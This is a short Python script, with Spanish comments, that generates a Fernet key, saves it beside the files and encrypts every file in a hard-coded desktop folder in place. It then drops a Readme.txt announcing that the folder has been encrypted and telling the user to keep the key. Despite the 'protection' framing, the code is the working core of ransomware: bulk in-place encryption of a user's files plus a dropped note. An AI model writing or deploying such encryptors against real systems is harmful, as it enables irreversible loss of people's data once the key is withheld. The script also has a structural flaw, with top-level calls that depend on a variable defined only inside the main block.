from cryptography.fernet import Fernet
import os


def keyGenerator():
    key = Fernet.generate_key()
    with open('key.key', 'wb')as key_file:
        key_file.write(key)


def returnKey():
    return open("key.key", "rb").read()


def encrypt(items, key):
    i = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        data = i.encrypt(file_data)

        with open(item, 'wb')as file:
            file.write(data)


if __name__ == '__main__':

    #Este campo permite configurar el lugar donde va a proteger alguna informacion

    path = "C:\\Users\\BlackStar\\Desktop\\Nueva carpeta (2)"
    items = os.listdir(path)
    directories = [path + "\\" + x for x in items]

keyGenerator()
key = returnKey()
encrypt(directories, key)
with open(path + "\\" + "Readme.txt", 'w')as file:
    file.write("Su carpeta ha sido encriptada y protegida su informacion")
    file.write("Guarde la KEY para proteger sus datos")
